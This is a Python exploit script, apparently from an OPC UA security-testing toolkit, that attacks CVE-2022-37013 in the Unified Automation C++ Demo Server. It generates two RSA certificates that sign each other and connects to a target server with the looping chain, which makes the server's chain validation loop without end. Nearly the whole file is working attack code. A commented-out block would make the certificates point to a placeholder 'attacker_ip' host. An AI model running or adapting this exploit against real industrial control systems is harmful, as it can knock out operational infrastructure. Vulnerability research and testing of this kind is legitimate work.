# Certificate Infinite Chain Loop Attack
#   Some servers implemented the Certificate chain check by themselves and forgot to protect against a chain loop:
#   Example: CertA is signed by CertB which is signed by CertA
# Based on Sector7 idea from Pwn2Own ICS Miami 2022: https://sector7.computest.nl/post/2022-09-unified-automation-opcua-cpp/
#
# Known Affected Servers:
#   - Unified Automation OPC UA C++ Demo Server (UaAnsiServer Cpp) v1.9.2
#
# CVEs:
#  	- CVE-2022-37013: https://www.zerodayinitiative.com/advisories/ZDI-22-1029/
#

import datetime
import os
import tempfile

# pip install asyncua
from asyncua import Client
import asyncio

# pip install cryptography
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization


def attack(server_details):
    asyncio.run(attack_impl(server_details))

def save_file(name, data):
    with open(name, "wb") as f:
        f.write(data)

def make_cert(name, issuer, public_key, private_key, identifier, issuer_identifier):
    one_day = datetime.timedelta(1, 0, 0)

    builder = x509.CertificateBuilder()
    builder = builder.subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, name)]))
    builder = builder.issuer_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, issuer)]))
    builder = builder.not_valid_before(datetime.datetime.today() - (one_day * 7))
    builder = builder.not_valid_after(datetime.datetime.today() + (one_day * 90))
    builder = builder.serial_number(x509.random_serial_number())
    builder = builder.public_key(public_key)
    builder = builder.add_extension(x509.SubjectKeyIdentifier(identifier), critical=False)
    builder = builder.add_extension(x509.AuthorityKeyIdentifier(key_identifier=issuer_identifier, authority_cert_issuer=None, authority_cert_serial_number=None), critical=False)
    builder = builder.add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=False)

    # Add Issuer CA info
    # auth_info_access = []
    # uri = x509.UniformResourceIdentifier(f"URI:http://attacker_ip/ca_{issuer}.pem")
    # auth_info_access.append(x509.AccessDescription(access_method=x509.oid.AuthorityInformationAccessOID.CA_ISSUERS, access_location=uri))
    # builder = builder.add_extension(x509.AuthorityInformationAccess(descriptions=auth_info_access), critical=False)

    # No idea if all of these are needed, but data_encipherment is required.
    builder = builder.add_extension(x509.KeyUsage(digital_signature=True, content_commitment=True, key_encipherment=True, data_encipherment=True, key_agreement=True, key_cert_sign=True, crl_sign=True, encipher_only=False, decipher_only=False), critical=False)

    # The certificate is actually self-signed, but this doesn't matter because the signature is not checked.
    certificate = builder.sign(private_key=private_key, algorithm=hashes.SHA256(), backend=default_backend())
    return certificate


def make_certs_with_chain_loop(save_to="/tmp/"):
    # Keys A
    private_keyA = rsa.generate_private_key(public_exponent=65537, key_size=3072, backend=default_backend())
    public_keyA = private_keyA.public_key()

    # Keys B
    private_keyB = rsa.generate_private_key(public_exponent=65537, key_size=3072, backend=default_backend())
    public_keyB = private_keyB.public_key()

    # Certs
    certA = make_cert("A", "B", public_keyA, private_keyB, b"1", b"2")
    certB = make_cert("B", "A", public_keyB, private_keyA, b"2", b"1")

    ###### Cert A - PEM ###########
    cert_pem_A = certA.public_bytes(encoding=serialization.Encoding.PEM)
    key_pem_A = private_keyA.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )
    save_file(name=os.path.join(save_to, "certA.pem"), data=cert_pem_A)
    save_file(name=os.path.join(save_to, "keyA.pem"), data=key_pem_A)

    ###### Cert B  - PEM ###########
    cert_pem_B = certB.public_bytes(encoding=serialization.Encoding.PEM)
    key_pem_B = private_keyB.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )
    save_file(name=os.path.join(save_to, "certB.pem"), data=cert_pem_B)
    save_file(name=os.path.join(save_to, "keyB.pem"), data=key_pem_B)


    ###### Cert A - DER ###########
    cert_der_A = certA.public_bytes(encoding=serialization.Encoding.DER)
    key_der_A = private_keyA.private_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )
    save_file(name=os.path.join(save_to, "certA.der"), data=cert_der_A)
    save_file(name=os.path.join(save_to, "keyA.der"), data=key_der_A)

    ###### Cert B  - DER ###########
    cert_der_B = certB.public_bytes(encoding=serialization.Encoding.DER)
    key_der_B = private_keyB.private_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )
    save_file(name=os.path.join(save_to, "certB.der"), data=cert_der_B)
    save_file(name=os.path.join(save_to, "keyB.der"), data=key_der_B)
    return certA, certB

async def attack_impl(server_details):
    program_type, ip_addr, port, query_string = server_details

    # Prepare malicious certs - chain loop
    print("[-] Preparing certificates with cross chain loop..")
    temp_dir = tempfile.gettempdir()
    certA, certB = make_certs_with_chain_loop(save_to=temp_dir)
    print(f"[-] Certs saved to: '{temp_dir}'")

    # Prepare client
    print("[-] Preparing client..")
    opcua_uri = f"opc.tcp://{ip_addr}:{port}{query_string}"
    opcua_client = Client(opcua_uri)

    # Set security
    print("[-] Loading client cert..")
    await opcua_client.set_security_string(f"Basic256Sha256,SignAndEncrypt,{temp_dir}/certA.der,{temp_dir}/keyA.der")

    # Set the cert chain
    # host_certificate is the client_certificate
    opcua_client.security_policy.host_certificate = certA.public_bytes(serialization.Encoding.DER) +\
                                                    certB.public_bytes(serialization.Encoding.DER) +\
                                                    certA.public_bytes(serialization.Encoding.DER)
    # Connect
    print("[-] Connect with malicious certs")
    async with opcua_client:
        children = await opcua_client.nodes.objects.get_children()
        print(f"children: {children}")